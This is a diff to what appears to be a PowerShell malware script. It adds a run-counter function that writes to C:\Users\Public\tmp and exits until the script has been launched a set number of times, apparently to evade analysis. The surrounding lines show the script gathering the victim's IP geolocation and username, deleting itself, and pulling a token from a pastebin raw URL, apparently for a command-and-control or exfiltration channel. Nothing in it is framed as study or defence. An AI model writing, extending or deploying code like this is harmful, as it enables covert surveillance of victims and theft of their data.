@@ -84,6 +84,24 @@ function Get_Geo{
 	$info += "%E2%9D%96 MAP : https://extreme-ip-lookup.com/" +  $result[0].query + "%0A";
 	return ($info + "$0A--" + $env:UserName + "--");
 }
+function StartOn($num){
+	$num1 = $num -1 ;
+	$filename = "C:\Users\Public\tmp";
+	$exists = Test-Path $filename;
+	if ($exists -eq $false){
+		Set-Content $filename 1;
+		exit;
+	}
+	else
+	{
+		$num2 = [int](Get-Content $filename);
+		if ($num1 -ne $num2){
+			$num2 += 1;
+			Set-Content $filename $num2;
+			exit;
+		}
+	}
+}
 # End Functions #
 $me = (Get-Variable MyInvocation -Scope Script).Value.MyCommand.Path;
 If ($args[0] -ne $true){
@@ -92,6 +110,7 @@ If ($args[0] -ne $true){
 	rm $me;
 	exit;
 }
+StartOn(2);
 $pastebin = "https://pastebin.com/raw/nx353a7L";
 $string = Request($pastebin);
 $token = $string.split(" ")[0];
